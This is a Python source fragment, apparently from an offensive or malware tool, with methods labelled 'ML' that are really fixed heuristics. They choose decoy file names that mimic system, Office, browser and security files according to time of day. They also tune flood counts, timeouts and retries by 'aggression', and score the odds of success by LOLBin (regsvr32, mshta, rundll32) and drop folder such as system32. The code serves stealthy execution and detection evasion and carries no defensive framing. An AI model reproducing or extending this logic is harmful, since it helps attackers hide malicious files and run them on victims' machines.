    def ml_generate_optimal_masking(self, stealth_level, temporal_factors):
        """ML optimal masking strategy"""
        
        try:
            hour = temporal_factors.get('hour', 12)
            is_weekend = temporal_factors.get('is_weekend', False)
            is_business_hours = temporal_factors.get('is_business_hours', False)
            
            masking_categories = {
                'system_files': ['ntdll.dat', 'kernel32.log', 'user32.cache', 'gdi32.tmp'],
                'office_files': ['office.dll', 'outlook.dat', 'word.log', 'excel.tmp'],
                'browser_files': ['chrome.cache', 'firefox.dat', 'edge.log', 'browser.tmp'],
                'windows_files': ['windows.dat', 'system.log', 'registry.cache', 'service.tmp'],
                'security_files': ['security.log', 'audit.dat', 'policy.cache', 'firewall.tmp']
            }
            
            if is_business_hours and not is_weekend:
                preferred_categories = ['office_files', 'windows_files', 'system_files']
            elif 18 <= hour <= 23:
                preferred_categories = ['browser_files', 'windows_files', 'system_files']
            elif 0 <= hour <= 6:
                preferred_categories = ['system_files', 'security_files', 'windows_files']
            else:
                preferred_categories = ['windows_files', 'system_files', 'browser_files']
            
            if stealth_level > 0.8:
                num_categories = 1
            elif stealth_level > 0.6:
                num_categories = 2
            else:
                num_categories = 3
            
            selected_categories = preferred_categories[:num_categories]
            masking_files = []
            
            for category in selected_categories:
                category_files = masking_categories.get(category, masking_categories['system_files'])
                masking_files.extend(random.sample(category_files, min(2, len(category_files))))
            
            if len(masking_files) > 4:
                masking_files = random.sample(masking_files, 4)
            
            self.debug_log(f'ML Masking strategy: {len(masking_files)} files, categories: {selected_categories}')
            
            return masking_files
            
        except Exception as e:
            self.debug_log(f'ML masking error: {e}')
            return ['system.dat', 'windows.log', 'service.tmp']

    def ml_optimize_parameters(self, aggression_level, risk_tolerance, adaptation_rate):
        """ML parameter optimization"""
        
        try:
            base_flood = 50
            if aggression_level > 0.7:
                flood_multiplier = 1.5 + (aggression_level * 0.5)
            elif aggression_level < 0.3:
                flood_multiplier = 0.5 + (aggression_level * 0.5)
            else:
                flood_multiplier = 1.0
            
            optimal_flood = int(base_flood * flood_multiplier * (1 + risk_tolerance * 0.5))
            optimal_flood = max(25, min(200, optimal_flood))
            
            base_timeout = 5
            if adaptation_rate > 0.8:
                timeout_factor = 0.8
            elif adaptation_rate < 0.5:
                timeout_factor = 1.5
            else:
                timeout_factor = 1.0
            
            optimal_timeout = int(base_timeout * timeout_factor)
            optimal_timeout = max(3, min(10, optimal_timeout))
            
            base_retries = 3
            retry_factor = 1 + (risk_tolerance * 0.5) + (aggression_level * 0.3)
            optimal_retries = int(base_retries * retry_factor)
            optimal_retries = max(2, min(6, optimal_retries))
            
            return {
                'flood_count': optimal_flood,
                'timeout': optimal_timeout,
                'retry_count': optimal_retries
            }
            
        except Exception as e:
            self.debug_log(f'ML parameter optimization error: {e}')
            return {'flood_count': 100, 'timeout': 5, 'retry_count': 3}

    def ml_predict_success_probability(self, stealth_level, security_analysis, lolbin, folder):
        """ML success probability prediction"""
        
        try:
            base_success = 0.7
            
            stealth_factor = stealth_level * 0.3
            
            security_score = security_analysis.get('overall_score', 0.5)
            security_factor = (1 - security_score) * 0.2
            
            lolbin_success_rates = {
                'regsvr32': 0.85,
                'mshta': 0.9,
                'rundll32': 0.8,
                'forfiles': 0.7,
                'pcalua': 0.75
            }
            lolbin_factor = lolbin_success_rates.get(lolbin, 0.8) * 0.25
            
            if 'system32' in folder.lower():
                folder_factor = 0.15
            elif 'programdata' in folder.lower():
                folder_factor = 0.1
            else:
                folder_factor = 0.05
            
            success_probability = base_success + stealth_factor + security_factor + lolbin_factor + folder_factor
            success_probability = max(0.1, min(0.95, success_probability))
            
            return round(success_probability, 3)
            
        except Exception as e:
            self.debug_log(f'ML success prediction error: {e}')
            return 0.7

    def ml_assess_risk_level(self, aggression_level, risk_tolerance, security_analysis, success_probability):
        """ML risk level assessment"""
        
        try:
            aggression_risk = aggression_level * 0.3
            security_risk = security_analysis.get('overall_score', 0.5) * 0.4
            success_risk = (1 - success_probability) * 0.2
            tolerance_adjustment = risk_tolerance * 0.1
            
            total_risk = aggression_risk + security_risk + success_risk - tolerance_adjustment
            total_risk = max(0.0, min(1.0, total_risk))
            
            if total_risk < 0.3:
                risk_level = 'low'
            elif total_risk < 0.6:
                risk_level = 'medium'
            else:
                risk_level = 'high'
            
            return risk_level
            
        except Exception as e:
            self.debug_log(f'ML risk assessment error: {e}')
            return 'medium'

